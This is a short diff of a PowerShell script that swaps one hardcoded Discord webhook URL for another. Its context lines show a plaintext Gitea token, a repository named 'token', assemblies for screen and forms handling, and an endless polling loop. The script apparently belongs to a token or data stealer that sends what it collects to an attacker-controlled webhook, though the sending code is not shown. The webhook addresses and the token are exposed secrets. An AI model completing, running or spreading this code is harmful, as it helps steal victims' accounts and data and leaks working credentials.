@@ -20,7 +20,7 @@ $null = [System.Console]::OpenStandardOutput()
 Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
 
-$main_webhook = "https://discord.com/api/webhooks/1447179401505538162/PfZZSqMkjnk5jMAirVUTC0lizN8xvjH5-DbwXIpwrsLe2W2vOxrgA0PWjAI3R-YTx0Kc"
+$main_webhook = "https://discord.com/api/webhooks/1449042374532792400/VnrQdTvIOiQAaDLv0T_5JJnS8daEbQgiKDA-g6515_xNQj2XLprQcAPpRo51EhzpMEmk"
 $gitea_token = "a6e0af6ee2fdcfe459cd05a28654a55d4125f5a7"
 $repo_owner = "cannyyy"
 $repo_name = "token"
@@ -565,6 +565,7 @@ while($true) {
         Start-Sleep 30
     }
 }
+
 
 
 
